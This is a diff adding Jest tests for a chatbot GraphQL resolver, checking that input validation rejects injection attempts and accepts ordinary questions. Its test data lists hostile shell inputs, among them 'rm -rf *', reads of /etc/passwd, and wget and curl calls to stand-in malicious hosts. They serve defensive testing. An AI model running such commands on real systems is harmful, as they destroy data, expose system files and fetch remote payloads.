@@ -168,4 +168,95 @@ describe('Chatbot Resolvers', () => {
       expect(errors?.[0].extensions?.code).toBe('RATE_LIMITED');
     }
   });
+
+  describe('Input Validation - Security Patterns', () => {
+    let freshUser: any;
+    let freshToken: string;
+
+    beforeAll(async () => {
+      // Create a fresh user for security tests to avoid rate limit issues
+      const passwordHash = await bcrypt.hash('Test1234!', 10);
+      freshUser = await User.create({
+        name: 'Security Test User',
+        email: 'security@example.com',
+        password: passwordHash,
+        role: UserRole.USER
+      });
+      
+      // Clear rate limits for this user
+      const redisClient = getRedisClient();
+      await redisClient.del(`chatbot:${freshUser._id}`);
+    });
+
+    const dangerousInputs = [
+      { input: 'cd /tmp; rm -rf *', reason: 'shell semicolon' },
+      { input: 'test | cat /etc/passwd', reason: 'pipe operator' },
+      { input: 'hello && wget http://evil.com', reason: 'AND operator with wget' },
+      { input: '$(cat /etc/passwd)', reason: 'command substitution' },
+      { input: 'test `whoami`', reason: 'backtick execution' },
+      { input: 'look at ../../../etc/passwd', reason: 'path traversal' },
+      { input: 'curl http://malware.com/payload', reason: 'curl command' },
+      { input: 'run bash script', reason: 'bash keyword' },
+      { input: 'use python to hack', reason: 'python keyword' },
+      { input: 'eval(malicious)', reason: 'eval function' },
+      { input: 'exec(command)', reason: 'exec function' },
+      { input: 'test%00null', reason: 'null byte injection' },
+      { input: 'path%2f%2e%2e%2fetc', reason: 'URL-encoded traversal' },
+    ];
+
+    it.each(dangerousInputs)(
+      'should reject input containing $reason',
+      async ({ input }) => {
+        const context = { user: { id: freshUser._id, role: freshUser.role } };
+        const response = await executeOperation(
+          ASK_QUESTION_MUTATION,
+          { question: input },
+          context
+        );
+
+        expect(response.body.kind).toBe('single');
+        if (response.body.kind === 'single') {
+          const { errors, data } = response.body.singleResult;
+          // Dangerous input should be rejected - either by validation or shield
+          expect(errors).toBeDefined();
+          // The request should fail (no successful data)
+          expect(data?.askQuestion).toBeFalsy();
+        }
+      }
+    );
+
+    const safeInputs = [
+      'What programming languages do you know?',
+      'Tell me about your experience with React',
+      'How do you handle database connections?',
+      'What is your approach to testing?',
+      'Can you explain microservices architecture?',
+    ];
+
+    it.each(safeInputs)(
+      'should accept safe input: %s',
+      async (question) => {
+        // Clear rate limit before each safe input test
+        const redisClient = getRedisClient();
+        await redisClient.del(`chatbot:${freshUser._id}`);
+        
+        const context = { user: { id: freshUser._id, role: freshUser.role } };
+        const response = await executeOperation(
+          ASK_QUESTION_MUTATION,
+          { question },
+          context
+        );
+
+        expect(response.body.kind).toBe('single');
+        if (response.body.kind === 'single') {
+          const { data, errors } = response.body.singleResult;
+          // Should not have validation errors (may have rate limit errors which is fine)
+          const hasValidationError = errors?.some(e => 
+            e.message.includes('invalid characters or patterns')
+          );
+          expect(hasValidationError).toBeFalsy();
+        }
+      }
+    );
+  });
 });
